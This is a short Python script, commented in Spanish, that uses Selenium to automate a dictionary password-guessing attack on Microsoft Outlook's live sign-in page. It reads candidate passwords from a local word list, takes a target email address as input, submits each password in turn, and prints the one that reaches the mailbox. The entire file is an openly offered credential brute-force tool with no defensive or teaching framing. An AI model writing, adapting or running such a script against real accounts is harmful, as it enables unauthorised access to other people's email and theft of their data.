from selenium import webdriver
from selenium.webdriver.common.by import By
from selenium.webdriver.common.keys import Keys
import time

def load_dictionary(file_path='diccionario.txt'):
    with open(file_path, 'r') as file:
        passwords = file.readlines()
    return [password.strip() for password in passwords]

def brute_force_outlook(email, dictionary):
    driver = webdriver.Chrome()  # Asegúrate de tener el controlador de Chrome instalado
    driver.get("https://outlook.office.com/owa/")

    # Esperar a que la página cargue completamente
    time.sleep(5)

    # Encontrar el campo de entrada de correo electrónico y ingresar el correo
    email_field = driver.find_element(By.NAME, "loginfmt")
    email_field.send_keys(email)
    email_field.send_keys(Keys.RETURN)

    # Esperar a que la página de inicio de sesión de contraseña cargue
    time.sleep(5)

    for password in dictionary:
        # Encontrar el campo de entrada de contraseña y ingresar la contraseña
        password_field = driver.find_element(By.NAME, "passwd")
        password_field.send_keys(password)
        password_field.send_keys(Keys.RETURN)

        # Esperar a ver si la autenticación es exitosa
        time.sleep(5)

        # Verificar si estamos en la página principal de Outlook
        if "mail.office.com" in driver.current_url:
            print(f"Contraseña encontrada: {password}")
            break
        else:
            # Si no, volvemos a la página de inicio de sesión de contraseña
            driver.get("https://outlook.office.com/owa/")
            time.sleep(5)
            email_field = driver.find_element(By.NAME, "loginfmt")
            email_field.send_keys(email)
            email_field.send_keys(Keys.RETURN)
            time.sleep(5)

    driver.quit()

def main():
    email = input("Introduce el correo electrónico de Outlook: ")
    dictionary = load_dictionary()
    brute_force_outlook(email, dictionary)

if __name__ == "__main__":
    main()